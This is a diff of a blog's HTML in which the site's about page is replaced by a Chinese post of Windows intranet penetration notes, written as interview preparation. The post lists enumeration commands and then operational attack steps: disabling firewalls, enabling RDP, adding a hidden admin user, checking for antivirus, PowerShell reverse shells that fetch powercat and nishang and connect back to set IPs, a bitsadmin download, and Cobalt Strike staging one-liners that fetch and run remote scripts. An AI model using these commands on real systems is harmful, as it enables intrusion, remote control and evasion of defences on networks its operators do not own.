@@ -83,7 +83,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -386,12 +386,41 @@
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-内网渗透/Windows内网信息收集总汇" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%B6%E8%90%BD%E9%98%81"><span class="toc-text">关于叶落阁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2021-02-16 17:57:12'>2021-02-16 17:56</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">本机信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">查询网络配置信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%9C%AC%E6%9C%BA%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="toc-text">查询本机的服务信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-text">查询系统信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8"><span class="toc-text">查询进程列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">查看计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4"><span class="toc-text">查看主机开机时间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%9B%B8%E5%85%B3"><span class="toc-text">用户相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-text">查看端口列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%B7%B2%E6%89%93%E8%A1%A5%E4%B8%81"><span class="toc-text">查看已打补丁</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8"><span class="toc-text">查看共享列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%A1%A8%E5%92%8Carp%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98%E8%A1%A8"><span class="toc-text">路由表和arp高速缓存表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">防火墙</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%9F%A5%E7%9C%8B"><span class="toc-text">权限查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%9F%9F"><span class="toc-text">判断是否存在域</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E7%9A%84%E5%90%8D%E5%AD%97"><span class="toc-text">查看域的名字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E5%9F%9F%E5%86%85%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="toc-text">探测域内存活主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%9F%9F%E5%86%85%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3"><span class="toc-text">扫描域内开放端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">域内基本信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域用户信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E6%9C%BAwmic%E6%9F%A5%E6%9D%80%E8%BD%AF"><span class="toc-text">本机wmic查杀软</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%803389"><span class="toc-text">开3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5"><span class="toc-text">用户增删改查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%96%9C%E6%AC%A2%E7%94%A8%E7%9A%84"><span class="toc-text">一些喜欢用的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ps-cs-%E4%B8%8A%E7%BA%BF"><span class="toc-text">ps cs 上线</span></a></li></ol></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -404,37 +433,96 @@
     }
 </style>
 </div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
-<blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
-</blockquote>
-<blockquote>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-</blockquote>
-<blockquote>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于叶落阁"><a href="#关于叶落阁" class="headerlink" title="关于叶落阁"></a>关于叶落阁</h2><p><strong>叶落阁</strong> 是阁主（杨玉杰）的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> 生成，部署在 <a target="_blank" rel="noopener" href="https://pages.github.com/">GitHub Pages</a>主题 <a target="_blank" rel="noopener" href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
-<p><code>3-hexo</code> 主题使用交流可以加 Q群: <a target="_blank" href="//shang.qq.com/wpa/qunwpa?idkey=e8cf083cc097141eaf323396f1766809b8e90ff00c67bb441898f672892f6904"><img data-ignore border="0" src="//pub.idqqimg.com/wpa/images/group.png" alt="3-hexo使用交流" title="3-hexo使用交流"></a></p>
-<p>主要功能：</p>
-<ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a target="_blank" rel="noopener" href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
-</ul>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>前几天面试的时候被师傅问到了这个问题，当时不是很会，现在来学学</p>
+<h2 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h2><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><p>ipconfig /all</p>
+<h3 id="查询本机的服务信息"><a href="#查询本机的服务信息" class="headerlink" title="查询本机的服务信息"></a>查询本机的服务信息</h3><p>wmic service list brief</p>
+<p><img src="img/image-2.png" alt="img"></p>
+<h3 id="查询系统信息"><a href="#查询系统信息" class="headerlink" title="查询系统信息"></a>查询系统信息</h3><p>systeminfo</p>
+<p><img src="img/image-3.png" alt="img"></p>
+<h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><p>tasklist / wmic process list brief</p>
+<p><img src="img/image-4.png" alt="img"></p>
+<h3 id="查看计划任务"><a href="#查看计划任务" class="headerlink" title="查看计划任务"></a>查看计划任务</h3><p>schtasks /query /fo LIST /v 列出计划任务详细信息</p>
+<h3 id="查看主机开机时间"><a href="#查看主机开机时间" class="headerlink" title="查看主机开机时间"></a>查看主机开机时间</h3><p>net statistics workstation</p>
+<p><img src="img/image-6.png" alt="img"></p>
+<h3 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h3><p>net user 查看所有用户<br>net localgroup administrators 获取本地管理员信息</p>
+<h3 id="查看端口列表"><a href="#查看端口列表" class="headerlink" title="查看端口列表"></a>查看端口列表</h3><p>netstat -ano</p>
+<h3 id="查看已打补丁"><a href="#查看已打补丁" class="headerlink" title="查看已打补丁"></a>查看已打补丁</h3><p>wmic qfe get Caption,Description,HotFixID,InstalledOn</p>
+<h3 id="查看共享列表"><a href="#查看共享列表" class="headerlink" title="查看共享列表"></a>查看共享列表</h3><p>net share 查看本机共享列表和可访问的域共享列表<br>wmic share get name,path,status 查找共享列表</p>
+<p><img src="img/image-7.png" alt="img"></p>
+<h3 id="路由表和arp高速缓存表"><a href="#路由表和arp高速缓存表" class="headerlink" title="路由表和arp高速缓存表"></a>路由表和arp高速缓存表</h3><p>route print 路由表<br>arp -a arp高速缓存表</p>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>netsh firewall set opmode disable 关闭防火墙(Windows Server 2003 以前的版本)</p>
+<p>netsh advfirewall set allprofiles state off 关闭防火墙(Windows Server 2003 以后的版本)</p>
+<p>netsh firewall show config 查看防火墙配置<br>如果上面的命令被弃用，则使用<br>netsh advfirewall firewall show rule name=all</p>
+<p>根据参考，可以使用这个wmic一键获取本机信息<a target="_blank" rel="noopener" href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p>
+<h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p>whoami /all 查看自己的详细权限<br>net user xxx /domain 查看域内指定用户的权限</p>
+<h3 id="判断是否存在域"><a href="#判断是否存在域" class="headerlink" title="判断是否存在域"></a>判断是否存在域</h3><p>.net time /domain 若出现以下情况则不存在域</p>
+<p><img src="img/image-20.png" alt="img"></p>
+<p>若是报错：发生系统错误5，则存在域，但该用户不是域用户</p>
+<p>若是以下情况则说明存在域且已经在域中</p>
+<p><img src="img/image-21.png" alt="img"></p>
+<h3 id="查看域的名字"><a href="#查看域的名字" class="headerlink" title="查看域的名字"></a>查看域的名字</h3><p>net config workstation</p>
+<p><img src="img/image-22.png" alt="img"></p>
+<p>nslookup -type=srv _ldap._tcp(力推）</p>
+<p><img src="img/image-25.png" alt="img"></p>
+<p>这个很爽，域控主机名和IP一块弄出来了</p>
+<h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>1.使用工具 nbtscan <a target="_blank" rel="noopener" href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p>
+<p><img src="img/image-8.png" alt="img"></p>
+<p>2.查看arp高速缓存表</p>
+<p>arp -a</p>
+<p><img src="img/image-9-1613469427906.png" alt="img"></p>
+<p>3.ICMP协议探测（逐个ping）</p>
+<p>这个贼慢，但是不用下载其他应用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="img/image-10-1613469427724.png" alt="img"></p>
+<p>4.nmap直接开扫</p>
+<p>5.meterpreter会话中执行 run windows/gather/enum_ad_computers</p>
+<h3 id="扫描域内开放端口"><a href="#扫描域内开放端口" class="headerlink" title="扫描域内开放端口"></a>扫描域内开放端口</h3><p>1.nmap</p>
+<p>nmap 192.168.1.0/24</p>
+<p>2.工具 S扫描器</p>
+<p>3.自写脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#python3 慢的一批</span><br><span class="line">import socket</span><br><span class="line"> </span><br><span class="line">def get_ip_status(ip,port):</span><br><span class="line">    server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        server.connect((ip,port))</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is open&#39;.format(ip, port))</span><br><span class="line">    except Exception as err:</span><br><span class="line">        print(&#39;&#123;0&#125; port &#123;1&#125; is not open&#39;.format(ip,port))</span><br><span class="line">    finally:</span><br><span class="line">        server.close()</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    host &#x3D; &#39;172.16.0.198&#39;</span><br><span class="line">    for port in range(20,100):</span><br><span class="line">        get_ip_status(host,port)</span><br></pre></td></tr></table></figure>
+<h3 id="域内基本信息"><a href="#域内基本信息" class="headerlink" title="域内基本信息"></a>域内基本信息</h3><p>net group “domain computers” /domain 查询所有域成员计算机列表<br>net view /domain:HACHE 查询域内所有主机<br>net accounts /domain 获取域密码信息<br>nltest /domain_trusts 获取域信任信息<br>nltest /DCLIST:hacke 查看域控制器机器名<br>Nslookup -type=SRV_ldap._tcp 查看域控制器的主机名</p>
+<h3 id="域用户信息收集"><a href="#域用户信息收集" class="headerlink" title="域用户信息收集"></a>域用户信息收集</h3><p>net user /domain 向域控制器查询域内用户列表<br>wmic useraccount get /all 获取域内用户详细信息<br>net localgroup administrators 查询本地管理员用户<br>net group “domain admins” /domain 查询域管理员用户<br>net group “Enterprise admins” /domain 查询管理员用户组</p>
+<h3 id="本机wmic查杀软"><a href="#本机wmic查杀软" class="headerlink" title="本机wmic查杀软"></a>本机wmic查杀软</h3><p><code>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</code><br>or</p>
+<p>WMIC /namespace:\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</p>
+<h3 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h3><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
+<h3 id="用户增删改查"><a href="#用户增删改查" class="headerlink" title="用户增删改查"></a>用户增删改查</h3><p>net user username password /add 加用户</p>
+<p>net localgroup administrators username /add 添加XX到管理员账户</p>
+<h3 id="一些喜欢用的"><a href="#一些喜欢用的" class="headerlink" title="一些喜欢用的"></a>一些喜欢用的</h3><p>Windows 反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;); powercat -c 192.168.1.4 -p 9999 -e cmd</span><br><span class="line"></span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;9a3c747bcf535ef82dc4c5c66aac36db47c2afde&#x2F;Shells&#x2F;Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666</span><br></pre></td></tr></table></figure>
+<p>wmic 查杀软</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WMIC &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe</span><br><span class="line"></span><br><span class="line">WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List</span><br></pre></td></tr></table></figure>
+<p>开3389</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 0</span><br></pre></td></tr></table></figure>
+<p>常见杀软进程名<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39997829/article/details/92666552">https://blog.csdn.net/weixin_39997829/article/details/92666552</a></p>
+<p>cmd下载</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.xx.com&#x2F;code.jpg c:\users\sdyp\desktop\ff.jpg</span><br></pre></td></tr></table></figure>
+<p>获取盘符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic logicaldisk where drivetype&#x3D;3 get deviceid</span><br></pre></td></tr></table></figure>
+<h3 id="ps-cs-上线"><a href="#ps-cs-上线" class="headerlink" title="ps cs 上线"></a>ps cs 上线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c IEX((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx&#x2F;a.ps1&#39;))</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&#39;http:&#x2F;&#x2F;webserver&#x2F;payload.ps1&#39;)|iex&quot;</span><br><span class="line"></span><br><span class="line">powershell -exec bypass -f \\webdavserver\folder\payload.ps1   (smb)</span><br></pre></td></tr></table></figure>
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
 
-        </article>
-        
-        <p>
-            <a  class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">💰</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">
@@ -443,11 +531,11 @@
 <p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
     </div>
-</div>
-<div class="full-toc">
-    <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
 <a class="" id="rocket" ></a>
 
+    </div>
 </div>
 
 <div class="hide_box" onclick="dashangToggle()"></div>
